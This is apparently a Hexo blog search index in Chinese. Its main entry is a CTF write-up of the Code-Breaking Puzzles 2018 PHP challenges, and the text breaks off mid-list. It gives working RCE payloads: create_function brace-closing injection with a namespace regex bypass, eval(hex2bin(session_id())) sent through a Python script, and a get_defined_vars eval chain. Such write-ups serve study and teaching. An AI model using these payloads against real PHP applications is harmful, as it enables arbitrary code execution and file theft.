<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>360网络安全职业认证 - CSSJ</title>
    <url>/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<html><head></head><body><p>&#x5B66;&#x6821;&#x8FD9;&#x8FB9;&#x653F;&#x7B56;&#x662F;&#x5927;&#x4E8C;&#x4E4B;&#x524D;&#x53EF;&#x4EE5;&#x514D;&#x8D39;&#x8003;&#x8BD5;&#x3002;&#x542B;&#x91D1;&#x91CF;&#x672A;&#x77E5;&#xFF0C;&#x7559;&#x4E2A;&#x7EAA;&#x5FF5;&#x3002;</p>
<a id="more"></a>



<br>



<p><img src="/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/image-20201113164910961.png" alt="image-20201113164910961"></p>
</body></html>]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Code-Breaking Puzzles 2018</title>
    <url>/2019/12/28/Code-Breaking-Puzzles-2018/</url>
    <content><![CDATA[<html><head></head><body><p>P&#x725B;&#x5728; 2018 &#x5E74;&#x51FA;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x770B;&#x4E86;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#xFF0C;&#x5BF9;&#x5176;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x77E5;&#x8BC6;&#x8FDB;&#x884C;&#x5C0F;&#x7ED3;&#x548C;&#x8865;&#x5145;&#x3002;</p>
<a id="more"></a>

<p>&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://code-breaking.com/" target="_blank" rel="noopener">https://code-breaking.com/</a></p>
<h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy-function"></a>easy-function</h2><p>&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x7ED9;&#x4E86;&#x9898;&#x76EE;&#x6E90;&#x7801;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="hljs-string">&apos;action&apos;</span>] ?? <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">$arg = $_GET[<span class="hljs-string">&apos;arg&apos;</span>] ?? <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/^[a-z0-9_]*$/isD&apos;</span>, $action)) {</span><br><span class="line">    show_source(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    $action(<span class="hljs-string">&apos;&apos;</span>, $arg);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x9996;&#x5148;&#x662F;&#x51FA;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x5E38;&#x89C1;&#x7684; &#x4E09;&#x5143;&#x8FD0;&#x7B97;&#x7B26; &#x3002;&#x67E5;&#x9605;&#x624B;&#x518C;&#x4E3A; PHP7 &#x65B0;&#x63A8;&#x51FA;&#x7684;&#x8868;&#x8FBE;&#x5F0F;.&#x7B80;&#x5355;&#x6982;&#x8FF0;&#x5E94;&#x8BE5;&#x5C31;&#x662F; <code>isset()</code> + &#x4E09;&#x5143;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x7ED3;&#x5408;&#x4F53;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/3ZxdEkYhRyzU1gr-20201117114451532.jpg" alt></p>
<p>&#x5927;&#x610F;&#x662F;&#x8BA9;&#x6211;&#x4EEC;&#x901A;&#x8FC7; GET &#x578B;&#x4F20;&#x4E24;&#x4E2A;&#x53C2;&#x6570;</p>
<p>&#x9898;&#x76EE;&#x901A;&#x8FC7;&#x6B63;&#x5219;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4; <code>preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)</code>&#xFF0C;&#x8981;&#x6C42;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x7531;&#x6570;&#x5B57;&#x5B57;&#x6BCD;&#x4E0B;&#x5212;&#x7EBF;&#x7EC4;&#x6210;</p>
<blockquote>
<p>/i &#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;<br>/s &#x5339;&#x914D;&#x4EFB;&#x4F55;&#x4E0D;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#xFF0C;&#x5305;&#x62EC;&#x7A7A;&#x683C;&#x3001;&#x5236;&#x8868;&#x7B26;&#x3001;&#x6362;&#x9875;&#x7B26;&#x7B49;&#x7B49;&#xFF0C;&#x7B49;&#x4EF7;&#x4E8E;[ \f\n\r\t\v]<br>/D &#x5982;&#x679C;&#x4F7F;&#x7528;$&#x9650;&#x5236;&#x7ED3;&#x5C3E;&#x5B57;&#x7B26;,&#x5219;&#x4E0D;&#x5141;&#x8BB8;&#x7ED3;&#x5C3E;&#x6709;&#x6362;&#x884C;</p>
</blockquote>
<p>&#x4E4B;&#x540E;&#x4F7F;&#x7528;&#x5D4C;&#x5957;&#x7684;&#x65B9;&#x5F0F; <code>$action(&apos;&apos;, $arg);</code> &#x6267;&#x884C;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x3002;&#x719F;&#x6089;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x8BDD;&#x4E0D;&#x96BE;&#x60F3;&#x5230; <code>create_function</code> &#x521B;&#x5EFA;&#x533F;&#x540D;&#x51FD;&#x6570;&#x6765;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x3002;</p>
<p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B; <code>create_function</code> &#x8FDB;&#x884C; RCE &#x7684;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x9700;&#x8981;&#x8C03;&#x7528;&#x4E00;&#x6B21;&#x51FD;&#x6570;&#x7684;&#x3002;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/zdGreME9pwW6IgO-20201117114451787.jpg" alt></p>
<p>trick&#xFF1A;P&#x725B;&#x5708;&#x5B50;&#x4E2D;&#xFF1A; <a href="https://t.zsxq.com/VRfqRFe&#x3002;" target="_blank" rel="noopener">https://t.zsxq.com/VRfqRFe&#x3002;</a> &#x521B;&#x5EFA;&#x533F;&#x540D;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x95ED;&#x5408;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230; RCE</p>
<blockquote>
<ol>
<li>&#x5982;&#x679C;&#x53EF;&#x63A7;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x9700;&#x8981;&#x95ED;&#x5408;&#x5706;&#x62EC;&#x53F7;&#x548C;&#x5927;&#x62EC;&#x53F7;&#xFF1A;create_function(&#x2018;){}phpinfo();//&#x2018;, &#x2018;&#x2019;);</li>
<li>&#x5982;&#x679C;&#x53EF;&#x63A7;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x9700;&#x8981;&#x95ED;&#x5408;&#x5927;&#x62EC;&#x53F7;&#xFF1A;create_function(&#x2018;&#x2019;, &#x2018;}phpinfo();//&#x2018;);</li>
</ol>
</blockquote>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">create_function(<span class="hljs-string">&apos;$a,$b&apos;</span>,<span class="hljs-string">&apos;return 111;}phpinfo();//&apos;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">($a, $b)</span></span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">111</span>;}phpinfo();<span class="hljs-comment">//</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6839;&#x636E;&#x9898;&#x76EE;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x56E0;&#x6B64;&#x95ED;&#x5408;&#x5927;&#x62EC;&#x53F7; <code>return &quot;P2hm1n&quot;;}phpinfo();/*</code> &#x6765;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x3002;</p>
<p>&#x968F;&#x540E;&#x662F; Bypass &#x6B63;&#x5219;&#x3002;&#x56DE;&#x987E;&#x6B63;&#x5219;&#x8981;&#x6C42;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x7531;&#x6570;&#x5B57;&#x5B57;&#x6BCD;&#x4E0B;&#x5212;&#x7EBF;&#x7EC4;&#x6210;&#x3002;&#x9996;&#x5148;<code>/D</code>&#x5982;&#x679C;&#x4F7F;&#x7528;$&#x9650;&#x5236;&#x7ED3;&#x5C3E;&#x5B57;&#x7B26;,&#x5219;&#x4E0D;&#x5141;&#x8BB8;&#x7ED3;&#x5C3E;&#x6709;&#x6362;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#x5728;&#x5F00;&#x5934;&#x63D2;&#x5165;&#x6362;&#x884C;&#x7B26;&#x3002;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/7RywWn4uXvVtY8S-20201117114451547.jpg" alt></p>
<p>&#x53EF;&#x4EE5;bypass&#x6B63;&#x5219;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x80FD;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x65E2;&#x80FD; bypass &#x6B63;&#x5219;&#x53C8;&#x80FD;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8981;&#x4E86;&#x89E3; php &#x7684; &#x547D;&#x540D;&#x7A7A;&#x95F4;<br><a href="https://www.php.net/manual/zh/language.namespaces.rationale.php" target="_blank" rel="noopener">&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x6982;&#x8FF0;</a></p>
<p>p&#x725B;&#x6709;&#x5982;&#x4E0B;&#x603B;&#x7ED3;</p>
<blockquote>
<p>php&#x91CC;&#x9ED8;&#x8BA4;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x662F;\&#xFF0C;&#x6240;&#x6709;&#x539F;&#x751F;&#x51FD;&#x6570;&#x548C;&#x7C7B;&#x90FD;&#x5728;&#x8FD9;&#x4E2A;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x4E2D;&#x3002;<br>&#x666E;&#x901A;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x5199;&#x51FD;&#x6570;&#x540D;function_name()&#x8C03;&#x7528;&#xFF0C;&#x8C03;&#x7528;&#x7684;&#x65F6;&#x5019;&#x5176;&#x5B9E;&#x76F8;&#x5F53;&#x4E8E;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF1B;<br>&#x800C;&#x5982;&#x679C;&#x5199;\function_name() &#x8FD9;&#x6837;&#x8C03;&#x7528;&#x51FD;&#x6570;&#xFF0C;&#x5219;&#x5176;&#x5B9E;&#x662F;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x3002;<br>&#x5982;&#x679C;&#x4F60;&#x5728;&#x5176;&#x4ED6;namespace&#x91CC;&#x8C03;&#x7528;&#x7CFB;&#x7EDF;&#x7C7B;&#xFF0C;&#x5C31;&#x5FC5;&#x987B;&#x5199;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x8FD9;&#x79CD;&#x5199;&#x6CD5;</p>
</blockquote>
<p>&#x6700;&#x540E;&#x627E;flag&#x7684;&#x4F4D;&#x7F6E;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x5373;&#x53EF;&#xFF0C;&#x9996;&#x5148;&#x627E;flag&#x4F4D;&#x7F6E;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/DfHwIxj73B2ruL6-20201117114451461.jpg" alt><br>&#x66F4;&#x6539;&#x547D;&#x4EE4;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/KliDd8bf5wRaGSZ-20201117114451463.jpg" alt></p>
<p>&#x6700;&#x540E;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">* ?action=\create_function</span><br><span class="line">&amp;arg=;}eval($_GET[&apos;cmd&apos;]);/*</span><br><span class="line">&amp;cmd=var_dump(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h2><p><strong>&#x9996;&#x5148;&#x662F;&#x6B63;&#x5219;&#x77E5;&#x8BC6;&#x70B9;&#x56DE;&#x987E;</strong></p>
<p><strong>&#x5143;&#x5B57;&#x7B26;</strong></p>
<table>
<thead>
<tr>
<th align="center">&#x5143;&#x5B57;&#x7B26;</th>
<th align="center">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">&#x53E5;&#x53F7;&#x5339;&#x914D;&#x4EFB;&#x610F;&#x5355;&#x4E2A;&#x5B57;&#x7B26;&#x9664;&#x4E86;&#x6362;&#x884C;&#x7B26;&#x3002;</td>
</tr>
<tr>
<td align="center">[ ]</td>
<td align="center">&#x5B57;&#x7B26;&#x79CD;&#x7C7B;&#x3002;&#x5339;&#x914D;&#x65B9;&#x62EC;&#x53F7;&#x5185;&#x7684;&#x4EFB;&#x610F;&#x5B57;&#x7B26;&#x3002;</td>
</tr>
<tr>
<td align="center">[^ ]</td>
<td align="center">&#x5426;&#x5B9A;&#x7684;&#x5B57;&#x7B26;&#x79CD;&#x7C7B;&#x3002;&#x5339;&#x914D;&#x9664;&#x4E86;&#x65B9;&#x62EC;&#x53F7;&#x91CC;&#x7684;&#x4EFB;&#x610F;&#x5B57;&#x7B26;</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">&#x5339;&#x914D;&gt;=0&#x4E2A;&#x91CD;&#x590D;&#x7684;&#x5728;*&#x53F7;&#x4E4B;&#x524D;&#x7684;&#x5B57;&#x7B26;&#x3002;</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">&#x5339;&#x914D;&gt;=1&#x4E2A;&#x91CD;&#x590D;&#x7684;+&#x53F7;&#x524D;&#x7684;&#x5B57;&#x7B26;&#x3002;</td>
</tr>
<tr>
<td align="center">?</td>
<td align="center">&#x6807;&#x8BB0;?&#x4E4B;&#x524D;&#x7684;&#x5B57;&#x7B26;&#x4E3A;&#x53EF;&#x9009;.</td>
</tr>
<tr>
<td align="center">{n,m}</td>
<td align="center">&#x5339;&#x914D;num&#x4E2A;&#x5927;&#x62EC;&#x53F7;&#x4E4B;&#x95F4;&#x7684;&#x5B57;&#x7B26; (n &lt;= num &lt;= m).</td>
</tr>
<tr>
<td align="center">(xyz)</td>
<td align="center">&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x5339;&#x914D;&#x4E0E; xyz &#x5B8C;&#x5168;&#x76F8;&#x7B49;&#x7684;&#x5B57;&#x7B26;&#x4E32;.</td>
</tr>
<tr>
<td align="center">&#x7AD6;&#x7EBF;</td>
<td align="center">&#x6216;&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5339;&#x914D;&#x7B26;&#x53F7;&#x524D;&#x6216;&#x540E;&#x7684;&#x5B57;&#x7B26;.</td>
</tr>
<tr>
<td align="center">\</td>
<td align="center">&#x8F6C;&#x4E49;&#x5B57;&#x7B26;,&#x7528;&#x4E8E;&#x5339;&#x914D;&#x4E00;&#x4E9B;&#x4FDD;&#x7559;&#x7684;&#x5B57;&#x7B26; <code>[ ] ( ) { } . * + ? ^ $ \ &#x7AD6;&#x7EBF;</code></td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">&#x4ECE;&#x5F00;&#x59CB;&#x884C;&#x5F00;&#x59CB;&#x5339;&#x914D;.</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">&#x4ECE;&#x672B;&#x7AEF;&#x5F00;&#x59CB;&#x5339;&#x914D;.</td>
</tr>
</tbody></table>
<p><code>.</code>&#x662F;&#x5143;&#x5B57;&#x7B26;&#x4E2D;&#x6700;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x3002; <code>.</code>&#x5339;&#x914D;&#x4EFB;&#x610F;&#x5355;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x4F46;&#x4E0D;&#x5339;&#x914D;&#x6362;&#x884C;&#x7B26;&#x3002; &#x4F8B;&#x5982;&#xFF0C;&#x8868;&#x8FBE;&#x5F0F;<code>.ar</code>&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;&#x5B57;&#x7B26;&#x540E;&#x9762;&#x8DDF;&#x7740;&#x662F;a&#x548C;r&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/4miyDCPHbhk65rB.jpg" alt></p>
<p>&#x65B9;&#x62EC;&#x53F7;&#x7684;&#x53E5;&#x53F7;&#x5C31;&#x8868;&#x793A;&#x53E5;&#x53F7;&#x3002; &#x8868;&#x8FBE;&#x5F0F; ar[.] &#x5339;&#x914D; ar.&#x5B57;&#x7B26;&#x4E32;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/FfdQSNcoUTZ2wOr.jpg" alt></p>
<p><strong>&#x7B80;&#x5199;&#x5B57;&#x7B26;&#x96C6;</strong></p>
<table>
<thead>
<tr>
<th align="center">&#x7B80;&#x5199;</th>
<th align="center">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">&#x9664;&#x6362;&#x884C;&#x7B26;&#x5916;&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;</td>
</tr>
<tr>
<td align="center">\w</td>
<td align="center">&#x5339;&#x914D;&#x6240;&#x6709;&#x5B57;&#x6BCD;&#x6570;&#x5B57;&#xFF0C;&#x7B49;&#x540C;&#x4E8E; [a-zA-Z0-9_]</td>
</tr>
<tr>
<td align="center">\W</td>
<td align="center">&#x5339;&#x914D;&#x6240;&#x6709;&#x975E;&#x5B57;&#x6BCD;&#x6570;&#x5B57;&#xFF0C;&#x5373;&#x7B26;&#x53F7;&#xFF0C;&#x7B49;&#x540C;&#x4E8E;&#xFF1A; <code>[^\w]</code></td>
</tr>
<tr>
<td align="center">\d</td>
<td align="center">&#x5339;&#x914D;&#x6570;&#x5B57;&#xFF1A; [0-9]</td>
</tr>
<tr>
<td align="center">\D</td>
<td align="center">&#x5339;&#x914D;&#x975E;&#x6570;&#x5B57;&#xFF1A; <code>[^\d]</code></td>
</tr>
<tr>
<td align="center">\s</td>
<td align="center">&#x5339;&#x914D;&#x6240;&#x6709;&#x7A7A;&#x683C;&#x5B57;&#x7B26;&#xFF0C;&#x7B49;&#x540C;&#x4E8E;&#xFF1A; <code>[\t\n\f\r\p{Z}]</code></td>
</tr>
<tr>
<td align="center">\S</td>
<td align="center">&#x5339;&#x914D;&#x6240;&#x6709;&#x975E;&#x7A7A;&#x683C;&#x5B57;&#x7B26;&#xFF1A; <code>[^\s]</code></td>
</tr>
<tr>
<td align="center">\f</td>
<td align="center">&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x6362;&#x9875;&#x7B26;</td>
</tr>
<tr>
<td align="center">\n</td>
<td align="center">&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;</td>
</tr>
<tr>
<td align="center">\r</td>
<td align="center">&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x56DE;&#x8F66;&#x7B26;</td>
</tr>
<tr>
<td align="center">\t</td>
<td align="center">&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x5236;&#x8868;&#x7B26;</td>
</tr>
<tr>
<td align="center">\v</td>
<td align="center">&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x5782;&#x76F4;&#x5236;&#x8868;&#x7B26;</td>
</tr>
<tr>
<td align="center">\p</td>
<td align="center">&#x5339;&#x914D; CR/LF&#xFF08;&#x7B49;&#x540C;&#x4E8E; \r\n&#xFF09;&#xFF0C;&#x7528;&#x6765;&#x5339;&#x914D; DOS &#x884C;&#x7EC8;&#x6B62;&#x7B26;</td>
</tr>
</tbody></table>
<p>&#x6838;&#x5FC3;&#x8003;&#x70B9;&#xFF1A; p&#x725B;&#x4E13;&#x95E8;&#x5199;&#x4E86;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x6765;&#x8BB2;&#x89E3;&#xFF1A;<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP&#x5229;&#x7528;PCRE&#x56DE;&#x6EAF;&#x6B21;&#x6570;&#x9650;&#x5236;&#x7ED5;&#x8FC7;&#x67D0;&#x4E9B;&#x5B89;&#x5168;&#x9650;&#x5236;</a></p>
<p><img src="/2019/12/28/Code-Breaking-Puzzles-2018/zu3QOrFa7cIRUsX.jpg" alt></p>
<blockquote>
<p>PHP&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;&#xFF08;reDOS&#xFF09;&#xFF0C;&#x7ED9;pcre&#x8BBE;&#x5B9A;&#x4E86;&#x4E00;&#x4E2A;&#x56DE;&#x6EAF;&#x6B21;&#x6570;&#x4E0A;&#x9650;pcre.backtrack_limit</p>
</blockquote>
<h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><p>&#x901A;&#x8FC7;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#xFF1A;<br><code>preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])</code></p>
<p>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x5206;&#x6790;<br><code>[^\W]</code> &#x7B49;&#x4EF7;  <code>\w</code></p>
<p>&#x5339;&#x914D;&#x62EC;&#x53F7;<br><code>\( ... \)</code></p>
<p>&#x800C; (?R) &#x5219;&#x662F; DEELX &#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x6269;&#x5C55;&#x8BED;&#x6CD5; &#x4E2D;&#x7684;&#x9012;&#x5F52;&#x8868;&#x8FBE;&#x5F0F; &#xFF0C; &#x8868;&#x793A;&#x9012;&#x5F52;&#x5F15;&#x7528;&#x6574;&#x4E2A;&#x6A21;&#x5F0F;<br><code>(?R)?</code></p>
<p>php&#x9012;&#x5F52;&#x6A21;&#x5F0F;&#xFF1A;<a href="https://www.php.net/manual/zh/regexp.reference.recursive.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/regexp.reference.recursive.php</a></p>
<p>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF1A;&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x7684;code&#x7684;&#x503C;&#x53EA;&#x80FD;&#x4E3A; fuc1(func2(func3(&#x2026;))) &#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x3002;<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/9is3mw7vytSBGlV.jpg" alt></p>
<p>&#x4E0D;&#x80FD;&#x52A0;&#x53C2;&#x6570;,&#x5426;&#x5219;&#x7ECF;&#x8FC7;&#x6B63;&#x5219;&#x66FF;&#x6362;&#x4E4B;&#x540E; &#x65E0;&#x6CD5;&#x4E0E; <code>;</code> &#x8FDB;&#x884C;&#x5F3A;&#x7B49;&#x4E8E;&#x6BD4;&#x8F83;</p>
<ul>
<li>&#x6CD5;&#x4E00;&#xFF1A; Apache&#x51FD;&#x6570;</li>
</ul>
<p>php &#x4E2D; apache &#x624B;&#x518C;: <a href="https://www.php.net/manual/zh/book.apache.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.apache.php</a><br>Apache&#x4E0B; &#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x51FD;&#x6570;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line">file_get_contents(array_pop(apache_request_headers()))</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>apache&#x73AF;&#x5883;&#x4E0B;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;<br>&#x5148;&#x4F7F;&#x7528; <code>var_dump()</code>&#x3001; <code>getallheaders()</code> &#x6210;&#x529F;&#x8FD4;&#x56DE;&#x4E86;http header&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;header&#x4E2D;&#x505A;&#x4E00;&#x4E9B;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x624B;&#x6BB5;&#x3002;</p>
<p>&#x7FFB;&#x6570;&#x7EC4;&#x7684;&#x624B;&#x518C;: <a href="https://www.php.net/manual/zh/ref.array.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.array.php</a></p>
<p>&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x8FDB;&#x4E00;&#x6B65;&#x5229;&#x7528;http header&#x7684; &#x81EA;&#x5B9A;&#x4E49;&#x5C5E;&#x6027;&#x8FDB;&#x884C;rce<br><img src="/2019/12/28/Code-Breaking-Puzzles-2018/cUmJ8VrTF1a96BM.jpg" alt></p>
<ul>
<li>&#x6CD5;&#x4E8C;&#xFF1A; session_id() </li>
</ul>
<p>session_id()  &#x53EF;&#x4EE5;&#x7528;&#x6765;&#x83B7;&#x53D6;/&#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x4F1A;&#x8BDD; ID&#x3002;</p>
<p>&#x9650;&#x5236;<code>&#x6587;&#x4EF6;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;&#x5668;&#x4EC5;&#x5141;&#x8BB8;&#x4F1A;&#x8BDD; ID &#x4E2D;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#xFF1A;a-z A-Z 0-9 ,&#xFF08;&#x9017;&#x53F7;&#xFF09;&#x548C; - &#x51CF;&#x53F7;</code></p>
<p>&#x7A81;&#x7834;&#xFF1A;16&#x8FDB;&#x5236;&#x8F6C;&#x6362;</p>
<p><code>eval(hex2bin(session_id()));</code> &#x5373;&#x53EF;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x547D;&#x4EE4;</p>
<p>payload</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://39.96.13.114:8084/index.php?code=eval(hex2bin(session_id(session_start())));&apos;</span><br><span class="line">payload = &quot;var_dump(scandir(&apos;./&apos;));&quot;.encode(&apos;hex&apos;)</span><br><span class="line">cookies = {</span><br><span class="line">	&apos;PHPSESSID&apos;:payload</span><br><span class="line">}</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6CD5;&#x4E09;: get_defined_vars()</p>
<p>&#x6B64;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6240;&#x6709;&#x5DF2;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;&#x5217;&#x8868;&#x7684;&#x591A;&#x7EF4;&#x6570;&#x7EC4;&#xFF0C;&#x8FD9;&#x4E9B;&#x53D8;&#x91CF;&#x5305;&#x62EC;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3001;&#x670D;&#x52A1;&#x5668;&#x53D8;&#x91CF;&#x548C;&#x7528;&#x6237;&#x5B9A;&#x4E49;&#x7684;&#x53D8;&#x91CF;&#x3002;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2019/12/28/Code-Breaking-Puzzles-2018/Bdvrf2SGNzyo8ZY.jpg" alt></p>
<p>&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x7684;&#x9009;&#x62E9;&#x4E5F;&#x5C31;&#x5177;&#x6709;&#x591A;&#x6837;&#x6027;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;$_GET&#x8FDB;&#x884C;RCE</p>
<p><code>?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo();</code></p>
<ul>
